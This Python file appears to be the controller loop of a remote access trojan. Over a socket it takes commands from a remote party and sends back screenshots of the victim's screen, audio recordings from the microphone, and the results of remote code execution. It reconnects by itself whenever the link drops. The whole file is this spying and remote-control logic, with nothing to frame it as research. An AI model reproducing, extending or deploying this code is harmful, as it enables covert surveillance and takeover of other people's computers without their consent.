# Modules
from modules.screenshot.screenshots import Screenshots
from modules.config.config import Configuration
from modules.record_audio.record_audio import Audio
from modules.code_execution.code_execution import CodeExecution
from modules.sockets.socket import Network

# Objects initialization
screen = Screenshots()
config = Configuration()
recording_audio = Audio()
nt = Network()
rce = CodeExecution(nt)

# Options list
options_list = ["1. Screenshot", "2. Record Audio", "3. RCE", "4. Print text"]

# Functions (switch list)
def screenshot():
    msg = screen.take_and_save(nt)
    nt.connectionSend(msg.encode("ascii"))

def record_audio():
    msg = recording_audio.start_recording_audio(nt)
    nt.connectionSend(msg.encode("utf-8"))

def code_execution():
    msg = rce.code_execution()
    nt.connectionSend(msg.encode("utf-8"))

def selection_menu(option):
    switcher = {
        1: screenshot,
        2: record_audio,
        3: code_execution
    }
    callback = switcher.get(option, "Invalid option")
    return callback()

# Main function
def main():
    msg = "Ready\r\n"
    nt.connectionSend(msg.encode("utf-8"))    
    while True:
        msg = ''
        try:
            for item in options_list:
                print(item)
                msg += item+'\r\n'
            nt.connectionSend(msg.encode("utf-8"))
            selection_menu(int(nt.connectionRecv()))
        except (RuntimeError, TypeError, NameError, ValueError, OSError):
            nt.connectionClose()
            nt.__init__()
            nt.connectionSend("Reconnecting...".encode("utf-8"))
            print("Not a valid option")

if __name__== "__main__":
    main()